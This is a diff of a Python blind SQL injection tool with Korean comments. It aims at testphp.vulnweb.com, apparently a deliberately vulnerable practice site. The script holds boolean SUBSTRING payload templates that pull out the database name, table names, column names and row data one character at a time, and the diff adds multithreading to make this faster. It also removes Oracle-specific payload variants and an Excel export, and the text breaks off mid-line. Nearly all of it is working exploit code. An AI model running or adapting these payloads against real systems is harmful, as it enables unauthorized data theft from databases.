@@ -1,20 +1,17 @@
 import requests
-import pandas as pd
-from tabulate import tabulate
-import os
 import time
-from openpyxl import Workbook
-from openpyxl.styles import Font, PatternFill
+from tabulate import tabulate
 from datetime import datetime
 import urllib3
 import threading
+from queue import Queue
 
 # InsecureRequestWarning 무시 설정
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 설정 정보
 url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
-param_name = "artist"  # 공격할 파라미터 이름
+param_name = "artist"  # 공격할 파라메터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
 sleep_time = 0  # 요청 간 지연 시간 (초)
 
@@ -31,13 +28,6 @@ payload_templates = {
     "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
     "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
 }
-#
-#payload_templates = {
-#    "database_name": "1' AND SUBSTR((SELECT sys_context('userenv','instance_name') FROM dual), {i}, 1) = '{char}' -- ",
-#    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual) AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- ",
-#    "column_name": "1' AND SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name = '{table_name}' AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- ",
-#    "column_data": "1' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- "
-#}
 
 # 참/거짓 판별 함수
 def is_true_response(response):
@@ -58,23 +48,29 @@ def get_database_name():
     print("[정보] 데이터베이스 이름을 찾고 있습니다...")
     threads = []
     lock = threading.Lock()
+    queue = Queue()
 
-    def find_char(i, char):
+    def find_char():
         nonlocal db_name
-        payload = payload_templates["database_name"].format(i=i, char=char)
-        params = {param_name: payload}
-        response = send_request(params)
-        time.sleep(sleep_time)
-        if is_true_response(response):
-            with lock:
-                db_name += char
-                print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+        while not queue.empty():
+            i, char = queue.get()
+            payload = payload_templates["database_name"].format(i=i, char=char)
+            params = {param_name: payload}
+            response = send_request(params)
+            time.sleep(sleep_time)
+            if is_true_response(response):
+                with lock:
+                    db_name += char
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                queue.queue.clear()  # 다른 문자 없이 다시 시작
+            queue.task_done()
 
     for i in range(1, 50):  # 최대 길이 50자 가정
-        found_char = False
-        threads.clear()
         for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-            thread = threading.Thread(target=find_char, args=(i, char))
+            queue.put((i, char))
+        threads.clear()
+        for _ in range(10):  # 아주 빠르게 10개 스레드 사용
+            thread = threading.Thread(target=find_char)
             threads.append(thread)
             thread.start()
 
@@ -87,15 +83,6 @@ def get_database_name():
     print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
     print(f"총 1건" if db_name else "총 0건")
     return db_name
-
-# 모든 테이블의 컬럼 추출 함수
-def get_all_columns():
-    tables = get_table_names()
-    all_columns = {}
-    for table in tables:
-        columns = get_column_names(table)
-        all_columns[table] = columns
-    return all_columns
 
 # 테이블 이름 추출 함수
 def get_table_names(limit="ALL"):
@@ -188,48 +175,6 @@ def get_column_data(table_name, column_name, limit="ALL"):
     print(f"총 {len(data)}건")
     return data
 
-# 엑셀 저장 함수
-def save_to_excel(data, headers, base_filename):
-    # 파일명 생성 (오늘의 날짜 사용)
-    date_str = datetime.now().strftime("%Y-%m-%d")
-    filename = f"{base_filename}_{date_str}.xlsx"
-    count = 1
-    while os.path.exists(filename):
-        filename = f"{base_filename}_{date_str}({count}).xlsx"
-        count += 1
-
-    wb = Workbook()
-    ws = wb.active
-    ws.title = "Extracted Data"
-
-    # 헤더 작성 및 스타일 적용
-    for col_num, header in enumerate(headers, 1):
-        cell = ws.cell(row=1, column=col_num, value=header)
-        cell.font = Font(bold=True, color="FFFFFF")
-        cell.fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
-
-    # 데이터 작성
-    for row_num, row_data in enumerate(data, 2):
-        for col_num, cell_value in enumerate(row_data, 1):
-            ws.cell(row=row_num, column=col_num, value=cell_value)
-
-    # 열 너비 자동 조정
-    for col in ws.columns:
-        max_length = 0
-        col_letter = col[0].column_letter
-        for cell in col:
-            try:
-                if len(str(cell.value)) > max_length:
-                    max_length = len(str(cell.value))
-            except:
-                pass
-        adjusted_width = (max_length + 2)
-        ws.column_dimensions[col_letter].width = adjusted_width
-
-    # 엑셀 파일 저장
-    wb.save(filename)
-    print(f"[엑셀 저장 완료] 파일명: {filename}")
-
 # 명령 선택 실행 함수
 def main():
     global request_method
@@ -249,48 +194,11 @@ def main():
                 continue
 
         if choice == "1":
-            db_name = get_database_name()
+            get_database_name()
         elif choice == "2":
             limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            tables = get_table_names(limit)
+            get_table_names(limit)
         elif choice == "3":
-            table_choice = input("1. 특정 테이블의 컬럼 추출\n2. 전체 테이블의 컬럼 추출\n선택하세요: ").strip()
-            if table_choice == "1":
-                table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
-                limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-                columns = get_column_names(table_name, limit)
-            elif table_choice == "2":
-                all_columns = get_all_columns()
-            else:
-                print("잘못된 선택입니다. 다시 입력하세요.")
-        elif choice == "4":
-            table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
-            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ").strip().upper()
-            limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-
-            if column_name == "ALL":
-                columns = get_column_names(table_name)
-                all_data = {column: get_column_data(table_name, column, limit) for column in columns}
-                max_length = max(len(v) for v in all_data.values())
-                for column in all_data:
-                    all_data[column] += [""] * (max_length - len(all_data[column]))
-                data_rows = [list(row) for row in zip(*all_data.values())]
-                print(tabulate(data_rows, headers=all_data.keys(), tablefmt="grid"))
-                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
-                if save_choice == "Y":
-                    save_to_excel(data_rows, list(all_data.keys()), "extracted_data")
-            else:
-                data = get_column_data(table_name, column_name, limit)
-                print(tabulate([[d] for d in data] if data else [], headers=[column_name], tablefmt="grid"))
-                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
-                if save_choice == "Y":
-                    save_to_excel([[d for d in data]], [column_name], "extracted_data")
-        elif choice == "5":
-            print("프로그램을 종료합니다.")
-            break
-        else:
-            print("잘못된 선택입니다. 다시 입력하세요.")
-
-# 프로그램 실행
-if __name__ == "__main__":
-    main()
+            table_name = input("컬럼명을 가져올 테이블 이름을 입력하세요: ")
+            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            get_column_names(table
